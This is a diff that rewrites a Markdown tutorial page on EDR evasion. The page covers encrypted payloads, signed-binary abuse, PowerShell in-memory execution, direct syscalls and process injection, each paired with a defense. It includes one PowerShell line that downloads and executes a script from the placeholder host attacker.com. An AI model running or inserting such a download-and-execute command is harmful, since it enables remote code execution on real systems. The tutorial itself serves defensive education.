@@ -1,29 +1,105 @@
-# EDR EVASION
+---
+title: "EDR Evasion"
+topic: "edr-evasion"
+tags: [edr, evasion, malware, detection, powershell, antivirus, red-team]
+difficulty: advanced
+day: 25
+layout: default
+parent: Topics
+nav_order: 25
+---
 
-EDR, or endpoint detection and response, is a security technology that is designed to detect and respond to malicious activity on a network. EDR systems typically use a combination of techniques, such as network monitoring, behavioral analysis, and machine learning, to identify and stop threats. In this tutorial, we will discuss some techniques that attackers may use to evade EDR systems and how to defend against them.
+# EDR Evasion
 
-One common method of evading EDR is to use encrypted traffic to hide the malicious payload. Encrypting the payload makes it difficult for EDR systems to inspect and analyze the content of the traffic, allowing the attacker to sneak past the EDR's defenses. To defend against this tactic, organizations can use network traffic analysis to identify and block encrypted traffic from known malicious sources.
+## What You Will Learn
+- What EDR is and how it detects malicious activity
+- Common techniques attackers use to evade EDR
+- How defenders can protect against these evasion tactics
+- The role of scripting, signing, and encryption in evasion
 
-Another tactic that attackers may use to evade EDR is to use legitimate, signed applications to deliver the payload. In this case, the attacker will use a legitimate application, such as a trusted file transfer tool, to deliver the malicious payload. This tactic can be effective because EDR systems are typically configured to allow signed applications to run without interference. To defend against this tactic, organizations can implement application whitelisting, which only allows known, trusted applications to run on the network.
+## What Is It?
 
-Attackers may also try to evade EDR by using evasion techniques, such as changing the file name or modifying the file header, to make the payload appear legitimate. In this case, the attacker is trying to trick the EDR system into thinking that the payload is a benign file, rather than a malicious one. To defend against this tactic, organizations can use machine learning algorithms to analyze the behavior of the payload and identify any suspicious activity.
+**EDR (Endpoint Detection and Response)** is a security technology designed to detect and respond to malicious activity on endpoints (computers, servers, mobile devices). EDR systems typically use a combination of techniques — network monitoring, behavioral analysis, and machine learning — to identify and stop threats.
 
-In summary, EDR evasion is a common tactic used by attackers to bypass security systems and deliver malicious payloads. To defend against this tactic, organizations can use a combination of network traffic analysis, application whitelisting, and machine learning to identify and block encrypted traffic, signed applications, and evasion techniques.
+EDR evasion is the practice of bypassing these detection mechanisms so that malicious payloads can execute without triggering alerts.
 
+## Why It Matters
 
+Modern red team operations and advanced persistent threat (APT) actors regularly use EDR evasion techniques. Defenders need to understand these techniques to build better detection rules, and penetration testers need to know them to accurately simulate real-world attackers.
 
+## Key Concepts
 
-### There are several possible ways that an attacker could attempt to evade EDR on a Windows system. Some of these tactics include:
+### How EDR Works
 
-1. Using encrypted traffic: As mentioned earlier, attackers can use encryption to hide the malicious payload from EDR systems. This can be effective because EDR systems are typically not able to inspect encrypted traffic.
+EDR sensors typically:
+- Hook Windows API calls (userland hooks) to monitor system calls
+- Monitor the kernel through drivers for low-level operations
+- Analyze process behavior, memory, and network activity
+- Send telemetry to a backend for cloud-based analysis
 
-2. Using signed applications: Attackers may also try to use legitimate, signed applications to deliver the payload. In this case, the attacker will use a trusted application, such as a file transfer tool, to deliver the payload.
+The weakest link is userland API hooking — if an attacker can bypass those hooks, they bypass a significant portion of EDR detection.
 
-3. Using evasion techniques: Attackers may also try to evade EDR by using techniques such as changing the file name or modifying the file header to make the payload appear legitimate.
+## Common Evasion Techniques
 
-4. Using scripting languages: Attackers may use scripting languages, such as PowerShell, to execute the payload. This can be effective because scripting languages are often used for legitimate purposes and may not be flagged by EDR systems.
+### 1. Using Encrypted Traffic
 
-To defend against these tactics, organizations can use a combination of network traffic analysis, application whitelisting, and machine learning to identify and block encrypted traffic, signed applications, evasion techniques, and scripting languages. Additionally, organizations can implement network segmentation and access controls to limit the ability of attackers to move laterally within the network.
+Encrypting the payload makes it difficult for EDR systems to inspect and analyze traffic content, allowing the attacker to sneak past network-level defenses.
 
+**Defense:** Use network traffic analysis tools that can decrypt SSL/TLS traffic for inspection.
 
+### 2. Using Signed Applications (Living off the Land — LOLBins)
 
+Attackers use legitimate, trusted, signed applications (like `msbuild.exe`, `regsvr32.exe`, or `certutil.exe`) to execute malicious payloads. EDR systems are typically configured to allow signed binaries to run.
+
+**Defense:** Implement application whitelisting with behavioral restrictions, not just signature-based rules.
+
+### 3. Using Scripting Languages (PowerShell, WMI)
+
+Scripting languages are often used for legitimate purposes and may not be flagged by EDR systems. PowerShell is particularly powerful for executing in-memory payloads without touching the disk.
+
+```powershell
+# Example: Download and execute in memory (malicious pattern — for awareness only)
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+```
+
+**Defense:** Enable PowerShell Script Block Logging and Constrained Language Mode.
+
+### 4. Changing File Names or Modifying Headers
+
+Attackers modify the file header or rename the payload to make it appear legitimate, tricking signature-based detection.
+
+### 5. Direct Syscalls (Bypassing Userland Hooks)
+
+Since EDR hooks are placed in userland (in DLLs like `ntdll.dll`), attackers can bypass them by calling syscalls directly using their syscall numbers — skipping the hooked DLL entirely.
+
+```c
+// Instead of calling NtOpenProcess() via ntdll.dll (which is hooked),
+// call the syscall directly using the syscall number
+// This bypasses EDR userland hooks
+```
+
+**Defense:** Implement kernel-level monitoring to catch direct syscalls.
+
+### 6. Process Injection into Trusted Processes
+
+Inject malicious code into a trusted process (like `explorer.exe`) so the malicious activity appears to come from a legitimate process.
+
+**Defense:** Monitor for unusual memory allocations and cross-process writes.
+
+## Defensive Countermeasures
+
+To defend against EDR evasion:
+
+1. **Network traffic analysis**: Inspect traffic even when encrypted, using SSL inspection where appropriate.
+2. **Application whitelisting**: Only allow known, trusted applications to run.
+3. **Machine learning behavioral analysis**: Detect unusual behavior regardless of signatures.
+4. **Network segmentation**: Limit lateral movement even if a host is compromised.
+5. **Patch management**: Keep systems updated to remove known vulnerabilities.
+6. **Script block logging**: Enable detailed logging for PowerShell and other scripting environments.
+
+## Resources
+
+- [MITRE ATT&CK — Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
+- [TryHackMe — AV Evasion](https://tryhackme.com/room/avevasionshellcode)
+- [Malware Development — Direct Syscalls](https://jmpesp.me/malware-analysis-syscalls-example/)
+- [Red Team Notes — EDR Evasion](https://www.ired.team/offensive-security/defense-evasion)
